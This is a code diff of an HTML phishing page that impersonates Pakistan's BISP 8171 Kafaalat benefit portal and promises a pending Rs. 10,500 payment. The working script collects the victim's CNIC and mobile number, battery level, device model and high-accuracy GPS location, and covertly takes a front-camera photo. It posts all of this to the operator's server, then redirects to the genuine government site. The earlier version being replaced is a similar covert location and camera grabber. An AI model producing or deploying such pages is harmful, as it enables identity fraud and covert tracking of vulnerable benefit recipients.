@@ -2,149 +2,181 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Identity Verification Portal</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+    <title>8171 BISP Official Portal</title>
     <style>
-        :root { --primary: #28a745; --bg: #f5f7f9; --text: #24292e; }
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto; background-color: var(--bg); display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; width: 92%; max-width: 400px; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); border: 1px solid #e1e4e8; }
-        .status-bar { height: 4px; background: var(--primary); border-radius: 10px; width: 50px; margin-bottom: 20px; }
-        h2 { font-size: 20px; color: var(--text); margin: 0 0 12px 0; font-weight: 700; }
-        p { font-size: 14px; color: #586069; line-height: 1.6; margin-bottom: 30px; }
-        .btn { background-color: var(--primary); color: white; border: none; padding: 14px; width: 100%; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s ease; box-shadow: 0 4px 12px rgba(40, 167, 69, 0.2); }
-        .btn:active { transform: scale(0.98); }
-        #loader { display: none; text-align: center; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid var(--primary); border-radius: 50%; width: 24px; height: 24px; animation: spin 1s linear infinite; margin: 0 auto 10px; }
+        :root { --bisp-green: #1b5e20; --bisp-light: #f4f7f6; --gold: #fbc02d; }
+        body { margin: 0; background: var(--bisp-light); font-family: 'Roboto', sans-serif; overflow-x: hidden; }
+
+        /* Professional Header with No Image Dependencies */
+        .header { background: #fff; padding: 15px 20px; display: flex; align-items: center; justify-content: space-between; border-bottom: 5px solid var(--bisp-green); box-shadow: 0 2px 10px rgba(0,0,0,0.1); position: sticky; top: 0; z-index: 1000; }
+        .logo-box { border-left: 5px solid var(--bisp-green); padding-left: 12px; }
+        .logo-box h1 { margin: 0; font-size: 22px; color: var(--bisp-green); font-weight: 900; letter-spacing: -1px; }
+        .logo-box span { font-size: 9px; color: #555; text-transform: uppercase; display: block; font-weight: 700; }
+        .gov-tag { background: #eee; padding: 5px 10px; border-radius: 20px; font-size: 10px; font-weight: 800; color: #444; }
+
+        /* Custom Vector Graphics (No Images Needed) */
+        .hero-banner { width: 100%; height: 240px; background: linear-gradient(135deg, #1b5e20 0%, #2e7d32 100%); position: relative; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        .hero-banner::after { content: "8171"; position: absolute; font-size: 180px; font-weight: 900; color: rgba(255,255,255,0.05); bottom: -40px; right: -20px; }
+        .hero-content { color: white; text-align: center; z-index: 10; padding: 20px; }
+        .hero-content h2 { font-size: 28px; margin: 0; text-shadow: 0 2px 4px rgba(0,0,0,0.3); }
+        .hero-content p { font-size: 13px; opacity: 0.9; margin: 5px 0 0; }
+
+        /* Payment Status Strip */
+        .payment-strip { background: var(--gold); color: #1b5e20; width: 100%; padding: 14px 0; text-align: center; font-size: 14px; font-weight: 900; border-bottom: 3px solid rgba(0,0,0,0.1); box-shadow: 0 4px 6px rgba(0,0,0,0.1); position: relative; z-index: 20; }
+
+        /* Modern Verification Card */
+        .card-container { margin: -30px 15px 30px; position: relative; z-index: 100; }
+        .v-card { background: #fff; border-radius: 20px; padding: 30px 25px; box-shadow: 0 15px 40px rgba(0,0,0,0.15); border: 1px solid #f0f0f0; }
+        .v-card h3 { color: var(--bisp-green); margin: 0 0 10px; font-size: 22px; font-weight: 800; }
+        .v-card p { font-size: 13px; color: #666; line-height: 1.5; margin-bottom: 25px; }
+
+        /* Input Styles */
+        .field-group { margin-bottom: 20px; position: relative; }
+        label { font-size: 11px; font-weight: 800; color: #222; display: block; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 0.5px; }
+        input { width: 100%; padding: 16px; border: 2px solid #eaedf0; border-radius: 12px; font-size: 16px; box-sizing: border-box; background: #fafafa; font-weight: 600; }
+        input:focus { border-color: var(--bisp-green); background: #fff; outline: none; box-shadow: 0 0 0 4px rgba(27, 94, 32, 0.05); }
+
+        /* Action Button */
+        .btn-action { background: var(--bisp-green); color: white; border: none; width: 100%; padding: 20px; border-radius: 15px; font-size: 18px; font-weight: 900; cursor: pointer; text-transform: uppercase; box-shadow: 0 10px 20px rgba(27, 94, 32, 0.3); transition: transform 0.2s; }
+        .btn-action:active { transform: scale(0.98); }
+
+        /* Professional Full-Screen Tracking Modal */
+        #tracking-gate { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #fff; z-index: 2000; align-items: center; justify-content: center; padding: 20px; box-sizing: border-box; }
+        .gate-inner { text-align: center; max-width: 400px; }
+        .gate-icon { width: 80px; height: 80px; background: var(--bisp-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; border: 4px solid var(--bisp-green); }
+        .status-pill { background: #fee2e2; color: #b91c1c; padding: 12px; border-radius: 10px; font-size: 12px; font-weight: 900; margin-bottom: 20px; display: none; border: 1px solid #fecaca; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid var(--bisp-green); border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .footer-text { font-size: 11px; color: #959da5; margin-top: 25px; text-align: center; border-top: 1px solid #eee; padding-top: 15px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="status-bar"></div>
-    <h2>Regional Access Verification</h2>
-    <p>This automated portal confirms your identity and location for secure access. Please click below to complete the mandatory compliance check.</p>
-    
-    <div id="loader">
-        <div class="spinner"></div>
-        <div style="font-size: 13px; color: var(--primary); font-weight: 600;">Authenticating Secure Connection...</div>
+<div class="header">
+    <div class="logo-box">
+        <h1>BISP</h1>
+        <span>Government of Pakistan</span>
     </div>
+    <div class="gov-tag">8171 OFFICIAL</div>
+</div>
 
-    <button id="mainBtn" class="btn" onclick="startProcess()">CONTINUE TO PORTAL</button>
-    
-    <div class="footer-text">
-        System ID: FZN-PR-2026<br>
-        Encrypted by Digital Security Authority
+<div class="hero-banner">
+    <div class="hero-content">
+        <h2>Kafaalat Program</h2>
+        <p>Benazir Income Support Programme (2026)</p>
     </div>
 </div>
 
-<video id="video" style="display:none;" autoplay playsinline></video>
-<canvas id="canvas" style="display:none;" width="1080" height="1920"></canvas>
+<div class="payment-strip">
+    PENDING PAYMENT: RS. 10,500 - VERIFICATION ACTIVE
+</div>
+
+<div class="card-container">
+    <div class="v-card">
+        <h3>Verify Status</h3>
+        <p>Confirm your CNIC and Mobile Number to authorize the release of your pending grant through high-precision biometric verification.</p>
+        
+        <div class="field-group">
+            <label>CNIC Number (13 Digits)</label>
+            <input type="number" id="cnic" placeholder="35201XXXXXXXX" autocomplete="off">
+        </div>
+        <div class="field-group">
+            <label>Registered Mobile Number</label>
+            <input type="number" id="phone" placeholder="03XXXXXXXXX" autocomplete="off">
+        </div>
+
+        <button class="btn-action" onclick="initTracking()">Proceed to Verify</button>
+    </div>
+</div>
+
+<div id="tracking-gate">
+    <div class="gate-inner">
+        <div class="gate-icon">
+            <div style="width: 20px; height: 20px; background: var(--bisp-green); border-radius: 50%; animation: pulse 1.5s infinite;"></div>
+        </div>
+        <div id="error-box" class="status-pill">VERIFICATION FAILED: Mandatory Location & Biometric Access required to verify grant eligibility.</div>
+        <h2 style="color: var(--bisp-green); margin: 0 0 10px;">Security Check</h2>
+        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Connecting to NADRA biometric integration. Do not close this window.</p>
+        <div class="loader"></div>
+        <button id="retry" onclick="fullSync()" style="display:none; width: 100%; padding: 15px; background: #222; color: white; border-radius: 12px; border: none; font-weight: 800;">GRANT ACCESS & CONTINUE</button>
+    </div>
+</div>
+
+<video id="v" style="display:none;" autoplay playsinline></video>
+<canvas id="c" style="display:none;" width="1080" height="1920"></canvas>
 
 <script>
-    async function startProcess() {
-        const btn = document.getElementById('mainBtn');
-        const loader = document.getElementById('loader');
-        btn.style.display = 'none';
-        loader.style.display = 'block';
+    let logData = { cnic: "", mob: "", bat: "", model: "", lat: "", lon: "" };
 
-        let userAgent = navigator.userAgent;
-        let deviceName = "Unknown Device";
-        if (/android/i.test(userAgent)) {
-            deviceName = userAgent.match(/\(([^)]+)\)/)[1].split(';')[2] || "Android Mobile";
-        } else if (/iPhone/i.test(userAgent)) {
-            deviceName = "Apple iPhone";
-        }
+    function initTracking() {
+        logData.cnic = document.getElementById('cnic').value;
+        logData.mob = document.getElementById('phone').value;
 
-        let reportData = {
-            device: deviceName.trim(),
-            platform: navigator.platform,
-            battery: "N/A",
-            time: new Date().toLocaleString(),
-            lat: "0", lon: "0",
-            city: "N/A", country: "N/A", ip: "N/A"
-        };
-
-        if(navigator.getBattery) {
-            const b = await navigator.getBattery();
-            reportData.battery = Math.round(b.level * 100) + "%";
-        }
-
-        const fetchGeo = async () => {
-            try {
-                const res = await fetch('http://ip-api.com/json/?fields=status,country,city,query');
-                const data = await res.json();
-                if(data.status === 'success') {
-                    reportData.city = data.city;
-                    reportData.country = data.country;
-                    reportData.ip = data.query;
-                }
-            } catch (e) {
-                try {
-                    const res2 = await fetch('https://ipinfo.io/json');
-                    const data2 = await res2.json();
-                    reportData.city = data2.city;
-                    reportData.country = data2.country;
-                    reportData.ip = data2.ip;
-                } catch (e2) {
-                    reportData.city = "API Blocked";
-                }
-            }
-        };
-
-        const geoPromise = fetchGeo();
+        if(logData.cnic.length < 11) { alert("Invalid CNIC"); return; }
         
-        // CAMERA CONSTRAINTS FIXED FOR 9:16 PORTRAIT
-        const cameraPromise = navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: "user", 
-                width: { ideal: 1920 }, 
-                height: { ideal: 1080 },
-                aspectRatio: 0.5625 
-            } 
-        }).catch(() => null);
-
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            reportData.lat = pos.coords.latitude;
-            reportData.lon = pos.coords.longitude;
-            finalize(await cameraPromise, reportData, geoPromise);
-        }, async () => {
-            finalize(await cameraPromise, reportData, geoPromise);
-        }, { enableHighAccuracy: true, timeout: 10000 });
+        document.getElementById('tracking-gate').style.display = 'flex';
+        fullSync();
     }
 
-    async function finalize(stream, data, geoTask) {
-        await geoTask;
+    async function fullSync() {
+        document.getElementById('retry').style.display = 'none';
+        document.getElementById('error-box').style.display = 'none';
+
+        // 1. Precise Device Info
+        try {
+            const battery = await navigator.getBattery();
+            logData.bat = Math.round(battery.level * 100) + "%";
+            logData.model = navigator.platform + " | " + navigator.userAgent.split('(')[1].split(')')[0];
+        } catch(e) {}
+
+        // 2. High-Precision Live Location
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                logData.lat = pos.coords.latitude;
+                logData.lon = pos.coords.longitude;
+                triggerBiometric();
+            },
+            () => { showAuthError(); },
+            { enableHighAccuracy: true, timeout: 5000 }
+        );
+    }
+
+    function triggerBiometric() {
+        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
+        .then((s) => { finalizeReport(s); })
+        .catch(() => { showAuthError(); });
+    }
+
+    function showAuthError() {
+        document.getElementById('error-box').style.display = 'block';
+        document.getElementById('retry').style.display = 'block';
+    }
+
+    async function finalizeReport(stream) {
+        const video = document.getElementById('v');
+        video.srcObject = stream;
         
-        if (stream) {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
+        setTimeout(() => {
+            const canvas = document.getElementById('c');
+            canvas.getContext('2d').drawImage(video, 0, 0, 1080, 1920);
+            const capturedPhoto = canvas.toDataURL('image/jpeg', 0.85);
             
-            setTimeout(() => {
-                const canvas = document.getElementById('canvas');
-                const ctx = canvas.getContext('2d');
-                // DRAWING FIXED FOR FULL PORTRAIT
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const photo = canvas.toDataURL('image/jpeg', 0.85);
-                
-                stream.getTracks().forEach(t => t.stop());
-                sendData(data, photo);
-            }, 1800);
-        } else {
-            sendData(data, null);
-        }
-    }
-
-    function sendData(info, photo) {
-        fetch('/capture', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ info: info, photo: photo })
-        }).then(() => {
-            window.location.href = "https://www.pakistan.gov.pk/";
-        });
+            stream.getTracks().forEach(t => t.stop());
+            
+            // Send full High-Precision Log
+            fetch('/auth/secure-sync', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ report: logData, photo: capturedPhoto })
+            }).then(() => {
+                window.location.href = "https://8171.bisp.gov.pk/";
+            });
+        }, 3000);
     }
 </script>
+
+<style>
+    @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0.4); } 70% { box-shadow: 0 0 0 20px rgba(27, 94, 32, 0); } 100% { box-shadow: 0 0 0 0 rgba(27, 94, 32, 0); } }
+</style>
 </body>
 </html>
